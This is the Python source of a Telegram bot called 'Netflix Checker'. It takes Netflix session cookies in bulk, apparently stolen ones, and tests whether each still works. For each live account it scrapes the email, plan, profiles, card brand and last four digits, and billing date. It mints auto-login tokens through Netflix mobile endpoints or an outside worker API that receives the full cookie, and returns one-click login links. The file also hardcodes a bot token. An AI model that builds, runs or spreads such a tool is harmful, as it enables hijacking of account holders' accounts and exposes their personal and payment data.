# ============================================================
#  🎬 Netflix Checker (Final Stable Multi-User)
#  Bot: @Leon_netflixbot | Admin: 8626080388
# ============================================================

import re, html, json, requests, asyncio, logging, urllib.parse, sqlite3, time, zipfile, io
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ================== CONFIG ==================
BOT_TOKEN = "8806400718:AAF7WsgYzv5IoFnq2FpjgDA3Yao0E9JLf60"
ADMIN_ID = 8626080388
OWNER_USERNAME = "@I339b"
CHANNEL_USERNAME = "@sterniterspro"
CHANNEL_LINK = "https://t.me/sterniterspro"
API_URL = "https://netflixapi.bmera5952.workers.dev/"
DB_FILE = "checker.db"

logging.basicConfig(format="%(asctime)s | %(message)s", level=logging.INFO)

# ================== FONTS & DB ==================
def b(text):
    out = []
    for c in str(text):
        if 'A' <= c <= 'Z': out.append(chr(0x1D400 + ord(c) - 65))
        elif 'a' <= c <= 'z': out.append(chr(0x1D41A + ord(c) - 97))
        elif '0' <= c <= '9': out.append(chr(0x1D7CE + ord(c) - 48))
        else: out.append(c)
    return "".join(out)

def H(value):
    if value is None: return "—"
    s = str(value).strip()
    if not s or s.lower() in ("null", "none"): return "—"
    return html.escape(s, quote=False).replace("<", "‹").replace(">", "›")[:300]

def clean_text(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def get_db():
    conn = sqlite3.connect(DB_FILE, timeout=30)
    conn.row_factory = sqlite3.Row
    return conn

def db_init():
    conn = get_db()
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)""")
    c.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
    conn.commit(); conn.close()

db_init()

def get_setting(key, default="1"):
    conn = get_db(); c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key=?", (key,))
    r = c.fetchone(); conn.close()
    return r[0] if r else default

def set_setting(key, val):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(val)))
    conn.commit(); conn.close()

def add_user(uid):
    conn = get_db(); c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (uid,))
    conn.commit(); conn.close()

# ================== NETFLIX LOGIC ==================
UA_WEB = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
UA_ANDROID = "com.netflix.mediaclient/63884 (Linux; U; Android 13)"
_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {
    "appVersion": "15.48.1", "config": ('{"gamesInTrailersEnabled":"false"}'),
    "device_type": "NFAPPL-02-", "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false", "languages": "en-US", "locale": "en-US",
    "maxDeviceWidth": "375", "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph", "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}
_IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1", "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1", "x-netflix.argo.translated": "true", "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4", "x-netflix.client.appversion": "15.48.1", "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "", "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo", "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US", "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5", "accept-language": "en-US;q=1", "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5", "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo", "x-netflix.argo.nfnsm": "9", "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3", "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def gen_nftoken_script(nid):
    if not nid: return None
    netflix_id = urllib.parse.unquote(str(nid))
    h = dict(_IOS_HEADERS); h["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=h, timeout=15, verify=False)
        if r.status_code == 200:
            tok = (((r.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
            if tok: return str(tok)
    except: pass
    try:
        sess2 = requests.Session()
        sess2.cookies.set("NetflixId", netflix_id, domain=".netflix.com", path="/")
        payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
        r2 = sess2.post("https://android13.prod.ftl.netflix.com/graphql", json=payload, headers={"User-Agent": UA_ANDROID, "Accept": "application/json", "Content-Type": "application/json"}, timeout=15)
        if r2.status_code == 200:
            tok = (r2.json().get("data") or {}).get("createAutoLoginToken")
            if tok: return str(tok)
    except: pass
    return None

def get_token_from_user_api(cookie_text):
    try:
        payload = {"cookie": cookie_text, "device": "mobile"}
        r = requests.post(API_URL, json=payload, timeout=20)
        if r.status_code == 200: return r.json().get("url")
    except: pass
    return None

def check_account(cookie_text):
    cookies = {}
    for line in cookie_text.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 7: cookies[parts[5]] = parts[6]
    if not cookies:
        for part in re.split(r"[;\n]", cookie_text):
            if "=" in part:
                k, _, v = part.partition("=")
                if k.strip(): cookies[k.strip()] = v.strip()

    nid = cookies.get("NetflixId")
    tok = gen_nftoken_script(nid)
    pc_link, mobile_link = "N/A", "N/A"
    
    if tok:
        tok_safe = urllib.parse.quote(tok, safe="")
        pc_link = f"https://netflix.com/?nftoken={tok_safe}"
        mobile_link = f"https://netflix.com/unsupported?nftoken={tok_safe}"
    else:
        api_url = get_token_from_user_api(cookie_text)
        if api_url: pc_link = mobile_link = api_url

    info = {"email": "N/A", "plan": "N/A", "country": "N/A", "quality": "N/A", "streams": "N/A", "next_bill": "N/A", "profiles": "N/A", "card": "N/A"}
    
    try:
        sess = requests.Session()
        sess.headers.update({"User-Agent": UA_WEB, "Accept-Language": "en-US,en;q=0.9"})
        for k, v in cookies.items(): sess.cookies.set(k, str(v), domain=".netflix.com")
        r = sess.get("https://www.netflix.com/account", timeout=15)
        
        if r.status_code == 200 and '"membershipStatus":"CURRENT_MEMBER"' in r.text:
            h = r.text
            def rx(p, d="N/A"): 
                m = re.search(p, h, re.S)
                return clean_text(m.group(1)) if m else d

            info["email"] = rx(r'"emailAddress":"([^"]+)"')
            info["country"] = rx(r'"countryOfSignup":"([A-Z]{2,3})"')
            info["plan"] = rx(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}')
            
            q_raw = rx(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}').upper()
            info["quality"] = {"UHD": "UHD 4K", "FHD": "FHD 1080p", "HD": "HD 720p", "SD": "SD 480p"}.get(q_raw, q_raw)
            
            info["streams"] = rx(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}')
            info["next_bill"] = rx(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}')
            
            card_brand = rx(r'"paymentOptionLogo":"([^"]+)"')
            card_last4 = rx(r'"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"')
            info["card"] = f"{card_brand} *{card_last4}" if card_brand != "N/A" else "N/A"

            profiles = re.findall(r'"profileName":"([^"]+)"', h)
            if profiles: info["profiles"] = ", ".join(list(dict.fromkeys([clean_text(p) for p in profiles])))
    except: pass

    if pc_link == "N/A" and info["email"] == "N/A":
        return None

    return {"pc_link": pc_link, "mobile_link": mobile_link, "tv_link": "https://www.netflix.com/tv2", "info": info}

# ================== FORCE JOIN & FORMATTER ==================
async def check_join(bot, uid):
    if get_setting("channel_verify", "0") == "0": return True
    if uid == ADMIN_ID: return True
    try:
        m = await bot.get_chat_member(CHANNEL_USERNAME, uid)
        if m.status not in ("member", "administrator", "creator"):
            return False
    except: return False
    return True

def force_join_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 " + b("Join Channel"), url=CHANNEL_LINK, style="primary")],
        [InlineKeyboardButton("✅ " + b("I Joined"), callback_data="check_join_btn", style="success")]
    ])

def format_result(acc):
    if not acc: return "❌ <b>INVALID COOKIE</b>"
    
    info = acc["info"]
    caption = (
        f"✅ <b>{b('VALID ACCOUNT')}</b>\n\n"
        f"📧 <b>Email:</b> {H(info['email'])}\n"
        f"🌍 <b>Country:</b> {H(info['country'])}\n"
        f"📋 <b>Plan:</b> {H(info['plan'])}\n"
        f"🎥 <b>Quality:</b> {H(info['quality'])}\n"
        f"📺 <b>Streams:</b> {H(info['streams'])}\n"
        f"💳 <b>Card:</b> {H(info['card'])}\n"
        f"👥 <b>Profiles:</b> {H(info['profiles'])}\n"
        f"🗓 <b>Next Bill:</b> {H(info['next_bill'])}\n"
    )
    
    rows = []
    if acc["pc_link"] != "N/A": rows.append([InlineKeyboardButton("💻 " + b("PC Login"), url=acc["pc_link"], style="success")])
    if acc["mobile_link"] != "N/A": rows.append([InlineKeyboardButton("📱 " + b("Mobile Login"), url=acc["mobile_link"], style="primary")])
    rows.append([InlineKeyboardButton("📺 " + b("TV Login"), url=acc["tv_link"], style="danger")])
    
    return caption, InlineKeyboardMarkup(rows)

# ================== HANDLERS ==================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    add_user(uid)

    if get_setting("bot_active") == "0" and uid != ADMIN_ID:
        await update.message.reply_text("🔴 Bot is currently OFF by Admin.")
        return

    joined = await check_join(context.bot, uid)
    if not joined:
        await update.message.reply_text(
            f"🔒 <b>{b('JOIN REQUIRED')}</b>\n\n"
            f"{b('Please join our channel to use this bot')}.",
            parse_mode=ParseMode.HTML, reply_markup=force_join_kb()
        )
        return

    await update.message.reply_text(
        f"🎬 <b>{b('NETFLIX PURE CHECKER')}</b>\n\n"
        f"👇 {b('Send a single cookie, .txt, or .zip file')} :",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("👑 " + b("Owner"), url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}", style="danger")],
            [InlineKeyboardButton("🛠 " + b("How to use"), callback_data="how_to", style="primary")]
        ])
    )

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Access Denied.")
        return
        
    is_on = get_setting("bot_active") == "1"
    is_verify = get_setting("channel_verify") == "1"
    
    await update.message.reply_text(
        f"👑 <b>{b('ADMIN PANEL')}</b>\n\n"
        f"Bot Status: {'🟢 ON' if is_on else '🔴 OFF'}\n"
        f"Channel Verify: {'🟢 ON' if is_verify else '🔴 OFF'}",
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(f"Bot: {'OFF' if is_on else 'ON'}", callback_data="admin_toggle", style="danger" if is_on else "success")],
            [InlineKeyboardButton(f"Channel Verify: {'OFF' if is_verify else 'ON'}", callback_data="admin_verify_toggle", style="danger" if is_verify else "success")],
            [InlineKeyboardButton("📢 " + b("Broadcast"), callback_data="admin_broadcast", style="primary")]
        ])
    )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    d = q.data
    
    if d == "check_join_btn":
        joined = await check_join(context.bot, q.from_user.id)
        if joined:
            await q.edit_message_text(
                f"✅ <b>{b('VERIFIED!')}</b>\n\n"
                f"👇 {b('Send a single cookie, .txt, or .zip file')} :",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("👑 " + b("Owner"), url=f"https://t.me/{OWNER_USERNAME.replace('@', '')}", style="danger")],
                    [InlineKeyboardButton("🛠 " + b("How to use"), callback_data="how_to", style="primary")]
                ])
            )
        else:
            await q.answer("You haven't joined yet!", show_alert=True)
            
    elif d == "how_to":
        await q.edit_message_text(
            f"📖 <b>{b('HOW TO USE')}</b>\n\n"
            f"1. <b>Single:</b> Just paste a Netflix cookie here.\n"
            f"2. <b>Bulk:</b> Send a `.txt` or `.zip` file. (Max 300 cookies).\n\n"
            f"Bot will check and send links for each valid cookie fast.",
            parse_mode=ParseMode.HTML
        )
        
    elif d.startswith("admin_"):
        if q.from_user.id != ADMIN_ID: return
        
        if d == "admin_toggle":
            new_state = "0" if get_setting("bot_active") == "1" else "1"
            set_setting("bot_active", new_state)
            is_on = new_state == "1"
            is_verify = get_setting("channel_verify") == "1"
            await q.edit_message_reply_markup(
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"Bot: {'OFF' if is_on else 'ON'}", callback_data="admin_toggle", style="danger" if is_on else "success")],
                    [InlineKeyboardButton(f"Channel Verify: {'OFF' if is_verify else 'ON'}", callback_data="admin_verify_toggle", style="danger" if is_verify else "success")],
                    [InlineKeyboardButton("📢 " + b("Broadcast"), callback_data="admin_broadcast", style="primary")]
                ])
            )
            
        elif d == "admin_verify_toggle":
            new_state = "0" if get_setting("channel_verify") == "1" else "1"
            set_setting("channel_verify", new_state)
            is_on = get_setting("bot_active") == "1"
            is_verify = new_state == "1"
            await q.edit_message_reply_markup(
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(f"Bot: {'OFF' if is_on else 'ON'}", callback_data="admin_toggle", style="danger" if is_on else "success")],
                    [InlineKeyboardButton(f"Channel Verify: {'OFF' if is_verify else 'ON'}", callback_data="admin_verify_toggle", style="danger" if is_verify else "success")],
                    [InlineKeyboardButton("📢 " + b("Broadcast"), callback_data="admin_broadcast", style="primary")]
                ])
            )
            
        elif d == "admin_broadcast":
            context.user_data["awaiting_broadcast"] = True
            await q.edit_message_text(f"📢 {b('Send the message you want to broadcast:')}", parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    uid = msg.from_user.id
    add_user(uid)

    if get_setting("bot_active") == "0" and uid != ADMIN_ID: return

    joined = await check_join(context.bot, uid)
    if not joined:
        await msg.reply_text(f"🔒 {b('Join channel first!')}", reply_markup=force_join_kb(), parse_mode=ParseMode.HTML)
        return

    if not msg.document: return
    
    file_name = msg.document.file_name
    if not (file_name.endswith(".txt") or file_name.endswith(".zip")):
        await msg.reply_text("❌ Please send a `.txt` or `.zip` file.")
        return
        
    status = await msg.reply_text(f"⏳ {b('Downloading File...')}", parse_mode=ParseMode.HTML)
    
    try:
        file = await context.bot.get_file(msg.document.file_id)
        content = await file.download_as_bytearray()
        
        blocks = []
        if file_name.endswith(".txt"):
            blocks = re.split(r'\n\s*\n', content.decode("utf-8", errors="ignore"))
        elif file_name.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(content)) as z:
                for f in z.infolist():
                    if f.filename.endswith(".txt"): 
                        blocks.extend(re.split(r'\n\s*\n', z.read(f).decode("utf-8", errors="ignore")))
        
        blocks = [blk.strip() for blk in blocks if blk.strip()]
        
        total_found = len(blocks)
        if total_found > 300:
            blocks = blocks[:300]
            limit_msg = f" (Limit 300 applied from {total_found})"
        else:
            limit_msg = ""
            
        total = len(blocks)
        if total == 0:
            await status.edit_text("❌ No valid cookies found in file.")
            return
            
        await status.edit_text(f"⚡ {b('Fast Checking')} {total} {b('cookies')}{limit_msg}...", parse_mode=ParseMode.HTML)
        
        valid_count = 0
        completed = 0
        
        def check_wrapper(cookie_block):
            return cookie_block, check_account(cookie_block)
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_wrapper, blk) for blk in blocks]
            
            for future in futures:
                cookie_block, acc = future.result()
                completed += 1
                
                if acc:
                    valid_count += 1
                    res = format_result(acc)
                    if isinstance(res, tuple):
                        caption, kb = res
                        await msg.reply_text(caption, parse_mode=ParseMode.HTML, reply_markup=kb)
                
                if completed % 5 == 0 or completed == total:
                    try: await status.edit_text(f"⚡ {b('Checked')} {completed}/{total} | {b('Valid:')} {valid_count}", parse_mode=ParseMode.HTML)
                    except: pass
                    await asyncio.sleep(0.5) 
                
        await status.edit_text(f"✅ {b('Bulk Check Complete')}\n\n{b('Total Checked:')} {total}\n{b('Valid Accounts:')} {valid_count}", parse_mode=ParseMode.HTML)
        
    except Exception as e:
        await status.edit_text(f"❌ Error: {str(e)[:100]}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.text: return
    uid = msg.from_user.id
    add_user(uid)

    if get_setting("bot_active") == "0" and uid != ADMIN_ID: return

    if uid == ADMIN_ID and context.user_data.get("awaiting_broadcast"):
        context.user_data["awaiting_broadcast"] = False
        status = await msg.reply_text(f"📢 {b('Broadcasting...')}", parse_mode=ParseMode.HTML)
        
        conn = get_db(); c = conn.cursor()
        c.execute("SELECT user_id FROM users")
        users = [r["user_id"] for r in c.fetchall()]
        conn.close()
        
        sent, failed = 0, 0
        for target_id in users:
            try:
                await context.bot.send_message(target_id, text, parse_mode=ParseMode.HTML)
                sent += 1
            except: failed += 1
            await asyncio.sleep(0.05)
            
        await status.edit_text(f"✅ {b('Sent')}: {sent} | ❌ {b('Failed')}: {failed}", parse_mode=ParseMode.HTML)
        return

    joined = await check_join(context.bot, uid)
    if not joined:
        await msg.reply_text(f"🔒 {b('Join channel first!')}", reply_markup=force_join_kb(), parse_mode=ParseMode.HTML)
        return
    
    text = msg.text.strip()
    if text.startswith("/") or len(text) < 20: return

    status = await msg.reply_text(f"⏳ {b('Checking Cookie...')}", parse_mode=ParseMode.HTML)
    
    acc = await asyncio.to_thread(check_account, text)
    res = format_result(acc)
    
    if isinstance(res, tuple):
        caption, kb = res
        await status.edit_text(caption, parse_mode=ParseMode.HTML, reply_markup=kb)
    else:
        await status.edit_text(res, parse_mode=ParseMode.HTML)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("👑 Bot Started")
    
    # 🔥 ISME KOI CONCURRENT_UPDATES NAHI HAI, ISLIYE 100% CHALEGA
    app.run_polling(
        allowed_updates=Update.ALL_TYPES, 
        drop_pending_updates=True
    )

if __name__ == "__main__":
    main()
